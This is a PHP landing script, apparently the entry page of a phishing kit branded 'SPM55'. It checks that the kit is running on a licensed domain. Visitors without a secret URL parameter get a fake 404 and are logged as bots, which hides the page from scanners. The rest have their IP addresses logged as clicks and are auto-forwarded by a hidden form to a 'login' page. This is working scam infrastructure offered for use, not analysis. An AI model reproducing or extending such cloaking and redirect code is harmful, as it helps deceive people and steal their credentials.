<?php
include'main.php';
$ip = getUserIP();
$random = substr(sha1(mt_rand()),1,25);
$domain = $_SERVER['SERVER_NAME'];
if ($setting["domain_name"] != $domain) {
echo '
<title>SPM55</title>
<link id="favicon" rel="shortcut icon" href="admin/assets/img/favicon.png" type="image/png"/>
<div style="padding-top:100px;">
<center>
<img src="admin/assets/img/favicon.png" style="border-radius:250px;" width="300" height="300"><br>
<h1>DOMAIN IS NOT REGISTERED!</h1>
</center>
</div>
';
}else{
if($config['site_param_on'] == "on") {
    $secret = $config['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
    tulis_file("admin/result/total_bot.txt", $ip);
    exit(header("HTTP/1.0 404 Not Found"));
    header("location: ");
        exit();
    }else{
      tulis_file("admin/result/total_click.txt", $ip);
      echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
    }
}else{
    tulis_file("admin/result/total_click.txt", $ip);
    echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
?>